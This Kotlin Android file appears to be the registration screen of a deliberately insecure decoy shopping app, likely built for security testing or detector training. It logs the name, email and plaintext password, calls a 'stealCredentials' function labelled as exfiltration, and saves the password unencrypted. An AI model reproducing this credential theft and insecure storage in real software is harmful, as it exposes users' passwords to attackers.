package com.decoy.shopping.agent.ui

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.decoy.shopping.agent.R

class RegisterActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_register)

        val toolbar = findViewById<androidx.appcompat.widget.Toolbar>(R.id.toolbar)
        setSupportActionBar(toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(true)

        val nameInput = findViewById<EditText>(R.id.regName)
        val emailInput = findViewById<EditText>(R.id.regEmail)
        val passwordInput = findViewById<EditText>(R.id.regPassword)
        val registerBtn = findViewById<Button>(R.id.registerBtn)
        val toLogin = findViewById<TextView>(R.id.toLogin)

        registerBtn.setOnClickListener {
            val name = nameInput.text.toString()
            val email = emailInput.text.toString()
            val pass = passwordInput.text.toString()

            if (name.isNotEmpty() && email.isNotEmpty() && pass.isNotEmpty()) {
                // INTENTIONAL VULNERABILITY: Massive data leak on registration
                Log.d("AGENT_DATA", "[DATA_LEAK] New User Registered (INSECURE)")
                Log.d("AGENT_DATA", "Name: $name")
                Log.d("AGENT_DATA", "Email: $email")
                Log.d("AGENT_DATA", "Password: $pass")

                // MALICIOUS ACTION: Exfiltrate new account data immediately
                com.decoy.shopping.agent.api.FakeApiClient.stealCredentials(email, pass)

                // Mock save in SharedPreferences
                val prefs = getSharedPreferences("decoy_prefs", MODE_PRIVATE)
                prefs.edit()
                    .putString("name", name)
                    .putString("email", email)
                    .putString("password", pass)
                    .apply()

                Toast.makeText(this, "Profile Created Successfully", Toast.LENGTH_SHORT).show()
                startActivity(Intent(this, LoginActivity::class.java))
                finish()
            } else {
                Toast.makeText(this, "All fields are required", Toast.LENGTH_SHORT).show()
            }
        }

        toLogin.setOnClickListener {
            finish() // Return to Login
        }
    }

    override fun onOptionsItemSelected(item: android.view.MenuItem): Boolean {
        if (item.itemId == android.R.id.home) {
            finish()
            return true
        }
        return super.onOptionsItemSelected(item)
    }
}
